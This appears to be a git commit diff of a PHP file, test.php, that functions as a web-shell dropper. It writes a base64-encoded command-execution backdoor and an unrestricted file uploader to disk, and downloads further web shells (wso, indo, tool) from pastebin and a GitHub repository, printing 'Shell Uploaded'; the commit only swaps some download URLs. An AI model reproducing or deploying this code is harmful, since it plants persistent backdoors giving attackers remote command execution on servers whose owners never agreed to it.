88959a9c0d537c2f98c37889627fd40a04e0a3fa
FrankWiX <33464238+FrankWiX@users.noreply.github.com>
2017-11-15 14:12:06 -0500

    Update test.php

--- test.php
+++ test.php
@@ -1,4 +1,4 @@
-<?php 
+<?php
 error_reporting(0);
 echo "Frank Wix <br> Server IP : ";
 echo gethostbyname($_SERVER["HTTP_HOST"]);
@@ -11,13 +11,13 @@ $back = 'PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWyJ3aXgiXSkpewpzeXN0ZW0oJF9SRVFVRVNUWyJ
 $wix = fopen("WiX/backdoor.php" ,"w"); fwrite ($wix ,base64_decode($back)); fclose($wix);
 $up = 'PD9waHAgZWNobyAnVXBsb2FkZXI8YnI+JztlY2hvICc8YnI+JztlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfWVsc2UgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfX0/Pg==';
 $a = fopen("WiX/up.php", "w"); fwrite($a,base64_decode($up)); fclose($a);
-$wso = file_get_contents('https://pastebin.com/raw/wso');
+$wso = file_get_contents('https://raw.githubusercontent.com/FrankWiX/c2hlbGw/master/wso.php');
 $b = fopen("WiX/wso.php", "w"); fwrite($b,$wso); fclose($b);
-$indo2 = file_get_contents('https://pastebin.com/raw/indo2');
+$indo2 = file_get_contents('https://raw.githubusercontent.com/FrankWiX/c2hlbGw/master/indo2.php');
 $c = fopen("WiX/indo2.php", "w"); fwrite($c,$indo2); fclose($c);
 $indo = file_get_contents('https://pastebin.com/raw/indo');
 $d = fopen("WiX/indo.php", "w"); fwrite($d,$indo); fclose($d);
-$tool = file_get_contents('https://pastebin.com/raw/tool');
+$tool = file_get_contents('https://raw.githubusercontent.com/FrankWiX/c2hlbGw/master/tool.php');
 $e = fonpen("WiX/tool.php","w"); fwrite($e,$tool); fclose($e);
 echo "<br>Shell Uploaded";
 }
